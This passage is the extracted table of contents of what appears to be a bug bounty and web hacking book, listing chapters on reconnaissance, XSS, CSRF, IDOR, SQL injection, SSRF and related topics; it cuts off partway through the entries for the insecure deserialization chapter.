[
  {
    "start": 1,
    "end": 6,
    "text": "BRIEF CONTENTS\nForeword  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xix\nIntroduction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .xxi\nPART I: THE INDUSTRY .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 1\nChapter 1: Picking a Bug Bounty Program . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .3\nChapter 2: Sustaining Your Success  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 15\nPART II: GETTING STARTED .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 31\nChapter 3: How the Internet Works  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 33\nChapter 4: Environmental Setup and Traffic Interception . . . . . . . . . . . . . . . . . . . . . . . . . .45\nChapter 5: Web Hacking Reconnaissance  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 61\nPART III: WEB VULNERABILITIES  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 109\nChapter 6: Cross-Site Scripting  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .111\nChapter 7: Open Redirects  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 131\nChapter 8: Clickjacking  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 143\nChapter 9: Cross-Site Request Forgery  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 155\nChapter 10: Insecure Direct Object References  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .175\nChapter 11: SQL Injection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .187\nChapter 12: Race Conditions  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 205\nChapter 13: Server-Side Request Forgery  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 213\nChapter 14: Insecure Deserialization  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 231\nChapter 15: XML External Entity . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .247\nChapter 16: Template Injection  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 261\nChapter 17: Application Logic Errors and Broken Access Control  . . . . . . . . . . . . . . . . . . 275\nChapter 18: Remote Code Execution  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 283\nChapter 19: Same-Origin Policy Vulnerabilities  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 295\nChapter 20: Single-Sign-On Security Issues . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .307\nChapter 21: Information Disclosure  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 323\nPART IV: EXPERT TECHNIQUES  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 333\nChapter 22: Conducting Code Reviews  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 335\nChapter 23: Hacking Android Apps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .347\nChapter 24: API Hacking  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 355\nChapter 25: Automatic Vulnerability Discovery Using Fuzzers . . . . . . . . . . . . . . . . . . . . .369\nIndex  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 381\nviii Brief Contents\nCONTENTS IN DETAIL\nFOREWORD xix\nINTRODUCTION xxi\nWho This Book Is For  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .xxii\nWhat Is In This Book . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxii\nHappy Hacking!  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxiv\nPART I: THE INDUSTRY 1\n1\nPICKING A BUG BOUNTY PROGRAM 3\nThe State of the Industry  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\nAsset Types . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\nSocial Sites and Applications  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 5\nGeneral Web Applications . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5\nMobile Applications (Android, iOS, and Windows)  . . . . . . . . . . . . . . . . . . . . 6\nAPIs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 6\nSource Code and Executables  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 7\nHardware and IoT . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 7\nBug Bounty Platforms  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 8\nThe Pros . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 8\nand the Cons  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 9\nScope, Payouts, and Response Times  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 9\nProgram Scope . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 9\nPayout Amounts  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10\nResponse Time  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 11\nPrivate Programs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 11\nChoosing the Right Program  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12\nA Quick Comparison of Popular Programs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 13\n2\nSUSTAINING YOUR SUCCESS 15\nWriting a Good Report . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16\nStep 1: Craft a Descriptive Title . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16\nStep 2: Provide a Clear Summary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16\nStep 3: Include a Severity Assessment  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16\nStep 4: Give Clear Steps to Reproduce  . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18\nStep 5: Provide a Proof of Concept . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18\nStep 6: Describe the Impact and Attack Scenarios . . . . . . . . . . . . . . . . . . . . . 19\nStep 7: Recommend Possible Mitigations  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 19\nStep 8: Validate the Report . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20\nAdditional Tips for Writing Better Reports . . . . . . . . . . . . . . . . . . . . . . . . . . . 20\nBuilding a Relationship with the Development Team  . . . . . . . . . . . . . . . . . . . . . . . . . . 21\nUnderstanding Report States . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21\nDealing with Conflict . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23\nBuilding a Partnership  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23\nUnderstanding Why You’re Failing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 24\nWhy You’re Not Finding Bugs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 24\nWhy Your Reports Get Dismissed  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 26\nWhat to Do When You’re Stuck . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27\nStep 1: Take a Break!  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28\nStep 2: Build Your Skill Set . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28\nStep 3: Gain a Fresh Perspective  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28\nLastly, a Few Words of Experience . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29\nPART II: GETTING STARTED 31\n3\nHOW THE INTERNET WORKS 33\nThe Client-Server Model  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 34\nThe Domain Name System  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 34\nInternet Ports  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 35\nHTTP Requests and Responses  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 36\nInternet Security Controls . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 38\nContent Encoding  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 38\nSession Management and HTTP Cookies  . . . . . . . . . . . . . . . . . . . . . . . . . . . 39\nToken-Based Authentication  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 40\nJSON Web Tokens  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 41\nThe Same-Origin Policy  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 43\nLearn to Program . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 44\n4\nENVIRONMENTAL SETUP AND TRAFFIC INTERCEPTION 45\nChoosing an Operating System . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 46\nSetting Up the Essentials: A Browser and a Proxy . . . . . . . . . . . . . . . . . . . . . . . . . . . . 46\nOpening the Embedded Browser  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 47\nSetting Up Firefox . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 47\nSetting Up Burp  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 49\nUsing Burp  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 51\nThe Proxy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 52\nThe Intruder  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 54\nThe Repeater  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 56\nThe Decoder . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 57\nThe Comparer  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 58\nSaving Burp Requests  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 58\nA Final Note on Taking Notes  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 58\nx Contents in Detail\n5\nWEB HACKING RECONNAISSANCE 61\nManually Walking Through the Target  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 62\nGoogle Dorking . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 62\nScope Discovery  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 65\nWHOIS and Reverse WHOIS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 65\nIP Addresses . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 66\nCertificate Parsing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 67\nSubdomain Enumeration  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 68\nService Enumeration  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 69\nDirectory Brute-Forcing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 70\nSpidering the Site  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 71\nThird-Party Hosting  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 74\nGitHub Recon . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 75\nOther Sneaky OSINT Techniques . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 77\nTech Stack Fingerprinting  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 78\nWriting Your Own Recon Scripts  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 80\nUnderstanding Bash Scripting Basics . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 80\nSaving Tool Output to a File . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 83\nAdding the Date of the Scan to the Output . . . . . . . . . . . . . . . . . . . . . . . . . . 84\nAdding Options to Choose the Tools to Run  . . . . . . . . . . . . . . . . . . . . . . . . . 84\nRunning Additional Tools  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 85\nParsing the Results . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 88\nBuilding a Master Report  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 90\nScanning Multiple Domains  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 92\nWriting a Function Library  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 96\nBuilding Interactive Programs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 97\nUsing Special Variables and Characters  . . . . . . . . . . . . . . . . . . . . . . . . . . 100\nScheduling Automatic Scans . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 102\nA Note on Recon APIs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 104\nStart Hacking! . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 104\nTools Mentioned in This Chapter  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 105\nScope Discovery . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 105\nOSINT . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 106\nTech Stack Fingerprinting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 106\nAutomation  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 107\nPART III: WEB VULNERABILITIES 109\n6\nCROSS-SITE SCRIPTING 111\nMechanisms  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 112\nTypes of XSS  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 115\nStored XSS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 115\nBlind XSS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 116\nReflected XSS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 117\nDOM-Based XSS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 117\nSelf-XSS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 119\nPrevention . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 119\nContents in Detail xi\nHunting for XSS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 120\nStep 1: Look for Input Opportunities  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 120\nStep 2: Insert Payloads  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 122\nStep 3: Confirm the Impact . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 125\nBypassing XSS Protection  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 126\nAlternative JavaScript Syntax  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 126\nCapitalization and Encoding  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 126\nFilter Logic Errors  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 127\nEscalating the Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 128\nAutomating XSS Hunting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 129\nFinding Your First XSS!  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 129\n7\nOPEN REDIRECTS 131\nMechanisms  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 131\nPrevention . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 133\nHunting for Open Redirects . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 133\nStep 1: Look for Redirect Parameters . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 133\nStep 2: Use Google Dorks to Find Additional Redirect Parameters . . . . . . . . . 134\nStep 3: Test for Parameter-Based Open Redirects . . . . . . . . . . . . . . . . . . . . . 135\nStep 4: Test for Referer-Based Open Redirects . . . . . . . . . . . . . . . . . . . . . . . 135\nBypassing Open-Redirect Protection  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 136\nUsing Browser Autocorrect . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 136\nExploiting Flawed Validator Logic  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 137\nUsing Data URLs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 138\nExploiting URL Decoding  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 138\nCombining Exploit Techniques  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 140\nEscalating the Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 140\nFinding Your First Open Redirect! . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 141\n8\nCLICKJACKING 143\nMechanisms  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 144\nPrevention . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 149\nHunting for Clickjacking  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 150\nStep 1: Look for State-Changing Actions  . . . . . . . . . . . . . . . . . . . . . . . . . . 150\nStep 2: Check the Response Headers  . . . . . . . . . . . . . . . . . . . . . . . . . . . . 151\nStep 3: Confirm the Vulnerability . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 151\nBypassing Protections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 151\nEscalating the Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 153\nA Note on Delivering the Clickjacking Payload  . . . . . . . . . . . . . . . . . . . . . . . . . . . . 154\nFinding Your First Clickjacking Vulnerability!  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 154\n9\nCROSS-SITE REQUEST FORGERY 155\nMechanisms  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 156\nPrevention . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 159\nHunting for CSRFs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 161\nStep 1: Spot State-Changing Actions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 161\nStep 2: Look for a Lack of CSRF Protections  . . . . . . . . . . . . . . . . . . . . . . . . 161\nStep 3: Confirm the Vulnerability . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 162\nxii Contents in Detail\nBypassing CSRF Protection  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 163\nExploit Clickjacking . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 163\nChange the Request Method . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 164\nBypass CSRF Tokens Stored on the Server  . . . . . . . . . . . . . . . . . . . . . . . . . 165\nBypass Double-Submit CSRF Tokens . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 167\nBypass CSRF Referer Header Check  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 168\nBypass CSRF Protection by Using XSS  . . . . . . . . . . . . . . . . . . . . . . . . . . . . 170\nEscalating the Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 170\nLeak User Information by Using CSRF  . . . . . . . . . . . . . . . . . . . . . . . . . . . . 170\nCreate Stored Self-XSS by Using CSRF . . . . . . . . . . . . . . . . . . . . . . . . . . . . 171\nTake Over User Accounts by Using CSRF . . . . . . . . . . . . . . . . . . . . . . . . . . 172\nDelivering the CSRF Payload . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 173\nFinding Your First CSRF!  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 174\n10\nINSECURE DIRECT OBJECT REFERENCES 175\nMechanisms  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 175\nPrevention . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 177\nHunting for IDORs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 178\nStep 1: Create Two Accounts  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 178\nStep 2: Discover Features . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 178\nStep 3: Capture Requests . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 179\nStep 4: Change the IDs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 180\nBypassing IDOR Protection  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 181\nEncoded IDs and Hashed IDs  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 181\nLeaked IDs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 182\nOffer the Application an ID, Even If It Doesn’t Ask for One . . . . . . . . . . . . . . 182\nKeep an Eye Out for Blind IDORs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 183\nChange the Request Method . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 183\nChange the Requested File Type  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 184\nEscalating the Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 184\nAutomating the Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 185\nFinding Your First IDOR!  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 185\n11\nSQL INJECTION 187\nMechanisms  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 188\nInjecting Code into SQL Queries . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 189\nUsing Second-Order SQL Injections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 191\nPrevention . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 192\nHunting for SQL Injections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 195\nStep 1: Look for Classic SQL Injections  . . . . . . . . . . . . . . . . . . . . . . . . . . . 195\nStep 2: Look for Blind SQL Injections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 196\nStep 3: Exfiltrate Information by Using SQL Injections  . . . . . . . . . . . . . . . . . 198\nStep 4: Look for NoSQL Injections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 199\nEscalating the Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 201\nLearn About the Database  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 201\nGain a Web Shell . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 202\nAutomating SQL Injections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 202\nFinding Your First SQL Injection! . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 203\nContents in Detail xiii\n12\nRACE CONDITIONS 205\nMechanisms  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 206\nWhen a Race Condition Becomes a Vulnerability . . . . . . . . . . . . . . . . . . . . . . . . . . . 207\nPrevention . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 210\nHunting for Race Conditions  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 210\nStep 1: Find Features Prone to Race Conditions  . . . . . . . . . . . . . . . . . . . . . 210\nStep 2: Send Simultaneous Requests  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 210\nStep 3: Check the Results . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 211\nStep 4: Create a Proof of Concept  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 211\nEscalating Race Conditions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 212\nFinding Your First Race Condition!  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 212\n13\nSERVER-SIDE REQUEST FORGERY 213\nMechanisms  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 213\nPrevention . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 215\nHunting for SSRFs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 216\nStep 1: Spot Features Prone to SSRFs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 216\nStep 2: Provide Potentially Vulnerable Endpoints with Internal URLs . . . . . . . . 218\nStep 3: Check the Results . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 218\nBypassing SSRF Protection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 220\nBypass Allowlists . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 220\nBypass Blocklists . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 221\nEscalating the Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 224\nPerform Network Scanning . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 224\nPull Instance Metadata . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 226\nExploit Blind SSRFs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 227\nAttack the Network  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 228\nFinding Your First SSRF!  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 229\n14\nINSECURE DESERIALIZATION 231\nMechanisms  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 232\nPHP  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 232\nJava  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 241\nPrevention . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 244\nHunting for Insecure Deserialization . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 244\nEscalating the Attack  . . . . . . . 